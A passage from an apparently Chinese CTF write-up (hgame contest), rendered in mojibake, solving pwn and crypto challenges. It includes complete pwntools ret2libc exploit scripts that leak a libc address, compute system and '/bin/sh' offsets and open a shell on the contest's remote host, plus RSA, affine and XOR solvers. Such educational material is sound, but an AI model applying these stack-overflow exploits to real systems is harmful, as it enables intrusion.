·çš„ç¥å™¨ï¼Œä¹Ÿæœ‰åœ¨çº¿æŸ¥çš„ç½‘ç«™ï¼Œæ‰€ä»¥é—®é¢˜ä¸å¤§ï¼‰</p><p>ç„¶åæˆ‘ä»¬å…ˆæ³„éœ²ä¸€ä¸‹ç¨‹åºé‡Œlibcçš„æŸå‡½æ•°çš„åœ°å€ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹ æƒ¯æ€§æ‰¾â€˜__libc_start_mainâ€™è¿™ä¸ªå‡½æ•°ï¼Œ</p><p>æ€ä¹ˆæ³„éœ²ï¼Ÿåˆ©ç”¨ä¹‹å‰æ‰¾åˆ°çš„pop edi;retï¼Œè·³åˆ°puts@plté‚£å»ï¼Œè¿™ä¸ªå‡½æ•°çš„åœ°å€æ€ä¹ˆæ‰¾</p><p><img src="https://i.loli.net/2020/04/30/LlpuXSwFjD94mA1.png" alt="img"></p><p>puts çš„å‚æ•°å³æŒ‡å‘â€˜__libc_start_mainâ€™çš„æŒ‡é’ˆçš„åœ°å€è¿™ä¹ˆæ‰¾ï¼š</p><p><img src="https://i.loli.net/2020/04/30/hgAE57Ue9NJPaGT.png" alt="img"></p><p><img src="upload/image-20200121230334511.png" alt="image-20200121230334511"></p><p><img src="upload/image-20200121230348242.png" alt="image-20200121230348242"></p><p>å›¾ä¸­çš„0000000000601030ï¼Œ</p><p>æ‰“è¿‡å»åæˆ‘ä»¬ä¼šæ”¶åˆ°â€˜__libc_start_mainâ€™å‡½æ•°çš„åœ°å€ï¼Œå…¶ä¸­åªæœ‰æœ€åä¸‰ä½æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå¼€å¯äº†ASLRï¼Œæ¯ä¸€æ¬¡çš„libcçš„åŸºå€éƒ½æ˜¯éšæœºçš„ï¼ˆä½†æœ€åä¸‰ä½æ€»æ˜¯æœ‰æ•ˆçš„ï¼‰ã€‚</p><p>ALSRå’ŒPIEçš„åŒºåˆ«ï¼š</p><p>ç®€å•æ¥è¯´ï¼Œå¼€å¯äº†ALSRï¼Œå †ã€æ ˆã€libcçš„åœ°å€ä¼šå‘ç”Ÿå˜åŒ–</p><p>å¼€å¯äº†ALSRååˆå¼€å¯äº†PIEï¼Œåˆ™ä»£ç æ®µå’Œæ•°æ®æ®µçš„åœ°å€ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–</p><p><img src="https://i.loli.net/2020/04/30/4ZiBMCbnfOKHDxu.png" alt="img"></p><p>æˆ‘ä»¬æ‹¿åˆ°è¿™åä¸‰ä½åœ°å€å» <a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a> æŸ¥</p><p><img src="https://i.loli.net/2020/04/30/VJclnhgNt9KwLso.png" alt="img"></p><p>æœ‰ä¸‰ä¸ªç»“æœï¼Œä¸€ä¸ªä¸ªè¯•è¿‡æ¥å¥½äº†ï¼Œæœ€åå‘ç°å‰ä¸¤ä¸ªç‰ˆæœ¬éƒ½æ˜¯å¯ä»¥çš„</p><p>å®ƒå·²ç»åˆ—å¥½äº†æˆ‘ä»¬éœ€è¦çš„å‡½æ•°å’Œå­—ç¬¦ä¸²ä¸æˆ‘ä»¬æ³„éœ²çš„é‚£ä¸ªå‡½æ•°åœ°å€çš„ç›¸å¯¹åç§»äº†</p><p>æˆ‘ä»¬ç›´æ¥åŠ ä¸Šå»å°±å¥½ã€‚å³</p><p>system_addr = leak_value + 0x24c50<br>s_addr = leak_value + 0x16c617</p><p>ï¼ˆå…¶å®æ‰¾put@pltå’ŒæŒ‡å‘å‡½æ•°â€˜__libc_start_mainâ€˜çš„æŒ‡é’ˆçš„åœ°å€æœ‰ä¸€ç§æ›´æ–¹ä¾¿çš„æ–¹æ³•ï¼‰</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"Number_Killer"</span>)</span><br><span class="line"></span><br><span class="line">elf<span class="selector-class">.symbols</span>[<span class="string">'puts'</span>] <span class="comment">//è¿”å›.textæ®µæˆ–è€….pltæ®µçš„å‡½æ•°åœ°å€</span></span><br><span class="line">elf<span class="selector-class">.got</span>[<span class="string">'__libc_start_main'</span>]<span class="comment">//è¿”å›gotè¡¨ä¸­å‡½æ•°æŒ‡é’ˆçš„åœ°å€</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬leakäº†libcçš„åœ°å€äº†ï¼Œæˆ‘ä»¬è¿˜è¦å›åˆ°ä¸»å‡½æ•°ï¼Œå†åˆ©ç”¨ä¸€æ¬¡æ¼æ´æ¥getshellï¼Œæ‰€ä»¥putsçš„è¿”å›åœ°å€æ˜¯</p><p>elf.symbols[â€˜mainâ€™]</p><p>å‰é¢è°ˆåˆ°ï¼Œiçš„å€¼ä¼šè¢«è¦†ç›–æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ³¨æ„æ§åˆ¶içš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨èµ°å®Œ11æ¬¡ä¹‹åï¼Œ</p><p>æˆ‘ä»¬ä¸€å…±å¡«æ»¡äº†88(0x58)ä¸ªå­—èŠ‚ï¼Œè·ç¦»iä¸­é—´è¿˜æœ‰4ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œäºæ˜¯æˆ‘ä»¬å¡«å››ä¸ªå­—èŠ‚çš„ffï¼Œç„¶åå¡«ä¸€ä¸ªæ•°ï¼Œå°±ä»£è¡¨içš„å€¼äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç›´æ¥è®©i=c,å› ä¸ºæ¥ä¸‹æ¥æˆ‘ä»¬è¦å‘é€gadgetçš„åœ°å€ï¼Œputs@pltçš„åœ°å€ï¼Œputs@pltçš„å‚æ•°ï¼Œputs@pltçš„è¿”å›åœ°å€ï¼ˆmainï¼‰ï¼Œi=cï¼Œæ­¤æ—¶åˆšå¥½å†™å…¥åœ°å€å°±åˆšå¥½æŒ‡å‘è¿”å›åœ°å€ã€‚</p><p>ç„¶åè®©ièµ°åˆ°19ï¼Œæ­¤æ—¶ç¨‹åºæ‰ä¼šè·³å‡ºå¾ªç¯ï¼Œå‡½æ•°æ‰ä¼šè¿”å›ï¼Œä¹Ÿå°±æ˜¯è·³åˆ°æˆ‘ä»¬å¾—puts@pltï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹‹åè¿˜è¦è¿›è¡Œå¡«å……ã€‚</p><p>ã€æ³¨ï¼Œ64ä½ç¨‹åºé€šè¿‡å¯„å­˜å™¨ä¼ å€¼ï¼Œæ‰€ä»¥æ˜¯pop rdiï¼›ret   å‡½æ•°å‚æ•°   å‡½æ•°åœ°å€   å‡½æ•°è¿”å›åœ°å€    è¿™æ ·çš„é¡ºåºï¼›</p><p>å¦‚æœæ˜¯32ä½ç¨‹åºï¼Œå°±ä¸ç”¨pop rdiï¼›retäº†ï¼Œç›´æ¥å¯ä»¥ä¼ ï¼šå‡½æ•°åœ°å€ å‡½æ•°è¿”å›åœ°å€ å‡½æ•°å‚æ•°ã€‘</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">elf = ELF(<span class="string">"Number_Killer"</span>)</span><br><span class="line">#libc =</span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./Number_Killer'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"numbers!\n"</span>)</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xffffffffffffffff)) #å¡«å……æ•°ç»„</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xcffffffff))#å°ç«¯åºï¼Œåå››ä¸ªå­—èŠ‚ç”¨æ¥å¡«å……ï¼Œ<span class="keyword">c</span>æ˜¯içš„å€¼</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>x400803))#ROPgadget --binary ./pwnme --<span class="keyword">only</span> <span class="string">"pop|ret"</span> | <span class="keyword">grep</span> <span class="string">'rdi'</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.got[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(elf.symbols[<span class="string">'main'</span>]))</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">         <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xdeadbeef))#å¡«å……ï¼Œè®©å¾ªç¯èµ°å®Œ</span><br><span class="line"></span><br><span class="line">    leak_value = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"leak_value %s"</span>%hex(leak_value))</span><br><span class="line">    #libc_base = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"></span><br><span class="line">    system_addr = leak_value + <span class="number">0</span>x24c50#åé¢çš„ç›¸å¯¹åç§»å°±æ˜¯ç½‘ç«™æŸ¥è¯¢å¾—æ¥çš„</span><br><span class="line">    sh_addr = leak_value + <span class="number">0</span>x16c617</span><br><span class="line"></span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"numbers!\n"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xffffffffffffffff))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xcffffffff))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>x400803))</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(sh_addr))#systemçš„å‚æ•°ï¼Œ<span class="string">'/bin/sh'</span>çš„åœ°å€</span><br><span class="line">    <span class="keyword">sh</span>.sendline(str(system_addr))#systemå‡½æ•°çš„åœ°å€ï¼ˆè¿™ä¸¤ä¸ªéƒ½æ˜¯libcé‡Œå¤´çš„ï¼‰</span><br><span class="line">    <span class="keyword">for</span> _ in <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">sh</span>.sendline(str(<span class="number">0</span>xdeadbeef))#å¡«å……ï¼Œè®©å¾ªç¯èµ°å®Œ</span><br><span class="line">        </span><br><span class="line">    # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">    # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20001"</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="ROP-LEVEL0"><a href="#ROP-LEVEL0" class="headerlink" title="ROP_LEVEL0"></a>ROP_LEVEL0</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-7"><a href="#é¢˜ç›®ä»‹ç»ï¼š-7" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>ROP is PWNersâ€™ romance<br>nc 47.103.214.163 20003</p><h4 id="è§£é¢˜æ€è·¯ï¼š-7"><a href="#è§£é¢˜æ€è·¯ï¼š-7" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>é¢„æœŸè§£åº”è¯¥æ˜¯æº¢å‡ºç„¶åå†™shellcodeåˆ©ç”¨orwå¾—åˆ°è¯»flagï¼Œä½†æ˜¯ï¼ŒROP is PWNersâ€™ romanceï¼Œ</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘åˆ©ç”¨çš„è¿˜æ˜¯ä¸Šä¸€é¢˜çš„ret2libcï¼Œåº”è¯¥æ˜¯éé¢„æœŸäº†ã€‚</p><p>é¦–å…ˆè¿™é‡Œä¼šè¯»0x100ä¸ªå­—ç¬¦è¿›v5ï¼Œä½†æ˜¯v5åœ¨æ ˆé‡Œçš„ä½ç½®</p><p>è·ç¦»æ ˆåº•æŒ‡é’ˆåªæœ‰0x50ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œè‚¯å®šæ˜¯å­˜åœ¨æ ˆæº¢å‡ºçš„ï¼Œç„¶åå¦‚ä¸Šé¢˜ä¸€æ ·çš„æ“ä½œï¼ˆå‡ºé¢˜äººå‡ºé¢˜ç”¨çš„åŒä¸€ä¸ªç¯å¢ƒï¼Œæ‰€ä»¥è„šæœ¬å‡ ä¹å¯ä»¥ç›´æ¥æ¬æ¥ï¼‰</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"ROP_LEVEL0"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn(url,port,<span class="keyword">debug</span>):</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">debug</span>==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">sh</span> = process(<span class="string">'./ROP_LEVEL0'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">sh</span> = remote(url,port)</span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"./flag\n"</span>)</span><br><span class="line"></span><br><span class="line">    buf = <span class="string">'a'</span>*(<span class="number">88</span>)</span><br><span class="line">    payload=buf+p64(<span class="number">0</span>x400753)#ROPgadget --binary ./pwnme --<span class="keyword">only</span> <span class="string">"pop|ret"</span> | <span class="keyword">grep</span> <span class="string">'rdi'</span></span><br><span class="line">    </span><br><span class="line">    payload+=p64(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">    payload+=p64(elf.symbols[<span class="string">'puts'</span>])</span><br><span class="line">    payload+=p64(elf.symbols[<span class="string">'main'</span>])</span><br><span class="line">    <span class="keyword">sh</span>.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    leak_value = u64(<span class="keyword">sh</span>.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="built_in">log</span>.success(<span class="string">"leak_value %s"</span>%hex(leak_value))</span><br><span class="line">   </span><br><span class="line">    system_addr = leak_value + <span class="number">0</span>x24c50#å’Œä¸Šä¸€é¢˜ä¸€æ ·~</span><br><span class="line">    sh_addr = leak_value + <span class="number">0</span>x16c617</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">sh</span>.recvuntil(<span class="string">"./flag\n"</span>)</span><br><span class="line">    buf = <span class="string">'A'</span>*(<span class="number">88</span>)</span><br><span class="line">    payload=buf+p64(<span class="number">0</span>x400753)</span><br><span class="line">    payload+=p64(sh_addr)#system(<span class="string">'/bin/sh'</span>)</span><br><span class="line">    payload+=p64(system_addr)#system()</span><br><span class="line">    payload+=p64(<span class="number">0</span>xdeadbeef)#è¿™é‡Œæ— æ‰€è°“äº†ï¼Œæˆ‘ä»¬éƒ½getshelläº†ï¼Œè¿”å›åœ°å€éšä¾¿å¡«äº†</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">sh</span>.sendline(payload)</span><br><span class="line"></span><br><span class="line">    # gdb.attach(<span class="keyword">sh</span>)</span><br><span class="line">    # pause()</span><br><span class="line">    <span class="keyword">sh</span>.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"47.103.214.163"</span>,<span class="string">"20003"</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="lnfantRSA"><a href="#lnfantRSA" class="headerlink" title="lnfantRSA"></a>lnfantRSA</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-8"><a href="#é¢˜ç›®ä»‹ç»ï¼š-8" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>çœŸ*ç­¾åˆ°é¢˜<br>p = 681782737450022065655472455411;<br>q = 675274897132088253519831953441;<br>e = 13;<br>c = pow(m,e,p*q) = 275698465082361070145173688411496311542172902608559859019841</p><h4 id="è§£é¢˜æ€è·¯ï¼š-8"><a href="#è§£é¢˜æ€è·¯ï¼š-8" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>çŸ¥é“æ‰€æœ‰çš„æ¡ä»¶äº†ï¼Œæˆ‘ä»¬åªéœ€è¦ç®—å‡ºç§é’¥då°±å¯ä»¥è§£å¯†äº†ï¼Œç§é’¥dæ˜¯å…¬é’¥åœ¨æ¨¡Ï†(n)ï¼Œå³æ˜¯è¿™é‡Œçš„Ï†(p<em>q)=(p-1)\</em>(q-1)</p><p>ç›´æ¥ç”¨gmpy2æ¨¡å—ä¸‹çš„invertå¯ä»¥æ±‚å‡ºç§é’¥æ¥ï¼Œd=gmpy2.invert(e,(p-1)*(q-1))</p><p>ç„¶åmï¼ˆå³flagï¼‰ä¸ºï¼šm=pow(c,d,p*q)</p><p>è¿™é‡Œè§£å¯†æ–¹ç¨‹çš„è¯æ˜ï¼š</p><p><img src="https://i.loli.net/2020/04/30/KAPMGRlaoXguwDx.png" alt="img"></p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p = 681782737450022065655472455411;</span><br><span class="line">q = 675274897132088253519831953441;</span><br><span class="line">e = 13;</span><br><span class="line">c = 275698465082361070145173688411496311542172902608559859019841</span><br><span class="line">d = gmpy2.invert(e,(p-1)*(q-1))</span><br><span class="line">m = pow(c,int(d),p*q)</span><br><span class="line">print hex(m)[2:-1].decode('hex')</span><br></pre></td></tr></table></figure><p>flag:hgame{t3Xt6O0k_R5A!!!}</p><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-9"><a href="#é¢˜ç›®ä»‹ç»ï¼š-9" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>Some basic modular arithmeticâ€¦</p><h4 id="è§£é¢˜æ€è·¯ï¼š-9"><a href="#è§£é¢˜æ€è·¯ï¼š-9" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>åŠ å¯†ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> A, B, flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">'hgame&#123;'</span>) <span class="keyword">and</span> flag.endswith(<span class="string">'&#125;'</span>)</span><br><span class="line"></span><br><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = len(TABLE)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> flag:</span><br><span class="line">    i = TABLE.find(b)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">-1</span>:</span><br><span class="line">        cipher += b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ii = (A*i + B) % MOD</span><br><span class="line">        cipher += TABLE[ii]</span><br><span class="line"></span><br><span class="line">print(cipher)</span><br><span class="line"><span class="comment"># A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;</span></span><br></pre></td></tr></table></figure><p>æ˜¯æ‹“å±•äº†å­—ç¬¦è¡¨çš„ä»¿å°„åŠ å¯† </p><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“æ”¾å°„åŠ å¯†çš„å…¬å¼æ˜¯ï¼šcâ‰¡Ax+B ï¼ˆmod mï¼‰å…¶ä¸­ï¼Œxä¸ºæ˜æ–‡ï¼Œcä¸ºå¯†æ–‡ï¼Œmä¸ºæ¨¡æ•°ï¼Œè¿™é‡Œm=len(TABLE)</p><p>æ‰€ä»¥å¯¹åº”çš„è§£å¯†å…¬å¼å³ä¸ºï¼šxâ‰¡(c-B) * A ^-1^ (mod m)ï¼Œè¿™é‡Œï¼ŒA^-1^æ˜¯Aåœ¨æ¨¡mä¸‹çš„é€†å…ƒï¼Œï¼ˆå¦‚rsaä¸­dæ˜¯eåœ¨æ¨¡Ï†(n)ä¸‹çš„é€†å…ƒä¸€èˆ¬ï¼‰ï¼Œ</p><p>é¢˜ç›®ä¸­ï¼Œæˆ‘ä¸çŸ¥é“Aï¼ŒBï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©çˆ†ç ´A,Bçš„æ–¹æ³•ï¼Œç„¶ååœ¨æ‰€æœ‰ç­”æ¡ˆä¸­æ‰¾åŒ…å«å­—ç¬¦â€˜hgameâ€™çš„ç»“æœã€‚ï¼ˆå› ä¸ºçŸ¥é“flagä¸­å‰äº”ä¸ªå­—ç¬¦ä¸ºhgameï¼Œæ‰€ä»¥å…¶å®ä¹Ÿå¯ä»¥è§£æ–¹ç¨‹ï¼Œä½†æ˜¯å› ä¸ºTABLEæ¯”è¾ƒå°ï¼Œä¸ºäº†æŠ¢ä¸ªä¸€è¡€ï¼Œå°±ç›´æ¥çˆ†äº†ï¼Œç”šè‡³è„šæœ¬ä¹Ÿæ˜¯åœ¨åŸåŸºç¡€ä¸Šç›´æ¥æ”¹çš„ï¼‰</p><h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">TABLE = <span class="string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span></span><br><span class="line">MOD = <span class="number">62</span></span><br><span class="line"><span class="keyword">for</span> A <span class="keyword">in</span> range(MOD):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> B <span class="keyword">in</span> range(MOD):</span><br><span class="line">        flag=<span class="string">""</span></span><br><span class="line">        cipher = <span class="string">'A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;'</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> cipher:</span><br><span class="line">            i = TABLE.find(b)</span><br><span class="line">            <span class="keyword">if</span> i == -<span class="number">1</span>:</span><br><span class="line">                flag += b</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                try:</span><br><span class="line">                    ii = (i-B)*invert(A,MOD)%MOD</span><br><span class="line">                    flag += TABLE[ii]</span><br><span class="line">                except:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'hgame'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            print flag</span><br><span class="line">            <span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line">            <span class="comment"># A8I5z&#123;xr1A_J7ha_vG_TpH410&#125;</span></span><br></pre></td></tr></table></figure><p>flagï¼šhgame{M4th_u5Ed_iN_cRYpt0}</p><h3 id="not-One-time"><a href="#not-One-time" class="headerlink" title="not_One_time"></a>not_One_time</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-10"><a href="#é¢˜ç›®ä»‹ç»ï¼š-10" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p>In cryptography, the one-time pad (OTP) is an encryption technique that cannot be cracked, butâ€¦<br>Just XOR ;P<br>nc 47.98.192.231 25001<br>hint: reduced key space</p><h4 id="è§£é¢˜æ€è·¯ï¼š-10"><a href="#è§£é¢˜æ€è·¯ï¼š-10" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>ä¸€æ¬¡æ€§å¯†ç æœ¬æœ¬èº«æ— è§£ï¼Œç¨‹åºæ¼æ´åœ¨äºkeyçš„ç©ºé—´è¢«ç¼©å‡äº†ï¼Œå¯ä»¥å¤šæ¬¡è¿æ¥è·å–å¯†æ–‡æ–‡æœ¬ï¼Œæ­¤æ—¶ä¸€ç›´ä¸å˜çš„flagåè€Œå¯ä»¥çœ‹ä½œæ˜¯ç”¨æ¥åŠ å¯†çš„keyäº†ã€‚ç„¶åçˆ†ç ´flagï¼Œä½¿å¾—flagçš„æ¯ä¸€ä½èƒ½è§£å¯† <strong>å¯†æ–‡æ–‡æœ¬</strong> çš„<strong>æ¯ä¸€é¡¹</strong>çš„å¯¹åº”ä½ï¼Œè§£å¯†æˆåŠŸçš„åˆ¤æ–­æ¡ä»¶æ˜¯æ¢å¤å‡ºçš„æ˜æ–‡åœ¨ç»™å‡ºçš„keyçš„ç©ºé—´ä¸­ã€‚</p><p>ä¸¾ä¸ªæ —å­ï¼š</p><p> flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦è‚¯å®šæ˜¯hå§ï¼Œ </p><p>æ¯”å¦‚æˆ‘ä»¬è¿æ¥20æ¬¡ï¼Œè·å¾—20ç»„å¯†æ–‡ï¼Œ</p><p> hå’Œæ¯ä¸€ç»„çš„å¯†æ–‡çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¼‚æˆ–ï¼Œè‚¯å®šä¹Ÿæ˜¯ä¸€ä¸ªå¯è§å­—ç¬¦ï¼Œ 